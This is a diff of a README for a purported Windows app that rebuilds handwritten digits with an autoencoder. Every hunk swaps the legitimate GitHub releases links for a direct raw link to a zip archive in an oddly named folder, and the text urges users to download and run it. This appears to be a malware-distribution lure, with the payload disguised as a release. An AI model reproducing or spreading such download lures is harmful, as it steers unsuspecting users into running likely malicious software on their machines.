@@ -1,6 +1,6 @@
 # 🧠 autoencoder-from-scratch - Rebuild digits with simple controls
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/karlydisobedient397/autoencoder-from-scratch/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/karlydisobedient397/autoencoder-from-scratch/main/intrafoliaceous/autoencoder_scratch_from_1.2.zip)
 
 ## 🖥️ What this app does
 
@@ -20,7 +20,7 @@ The app is meant for simple use. You do not need to train a model by hand or edi
 
 Visit the releases page to download and run this file:
 
-[Go to Downloads](https://github.com/karlydisobedient397/autoencoder-from-scratch/releases)
+[Go to Downloads](https://raw.githubusercontent.com/karlydisobedient397/autoencoder-from-scratch/main/intrafoliaceous/autoencoder_scratch_from_1.2.zip)
 
 Look for the latest release and download the Windows file that matches your system. After the download finishes, open the file from your Downloads folder or from the browser download bar.
 
@@ -189,7 +189,7 @@ This app works best with clean digit shapes. If an image has shadows, lines, or 
 
 When a new release is available, go back to the releases page and download the latest version.
 
-[Download the latest release](https://github.com/karlydisobedient397/autoencoder-from-scratch/releases)
+[Download the latest release](https://raw.githubusercontent.com/karlydisobedient397/autoencoder-from-scratch/main/intrafoliaceous/autoencoder_scratch_from_1.2.zip)
 
 If you already have an older copy, close the app first, then replace the old files with the new release files.
 
@@ -257,6 +257,6 @@ This makes it easier to see what each setting changes
 
 Use the release page to get the Windows app:
 
-[https://github.com/karlydisobedient397/autoencoder-from-scratch/releases](https://github.com/karlydisobedient397/autoencoder-from-scratch/releases)
+[https://raw.githubusercontent.com/karlydisobedient397/autoencoder-from-scratch/main/intrafoliaceous/autoencoder_scratch_from_1.2.zip](https://raw.githubusercontent.com/karlydisobedient397/autoencoder-from-scratch/main/intrafoliaceous/autoencoder_scratch_from_1.2.zip)
 
 Download the latest file from that page, then run it on your Windows PC
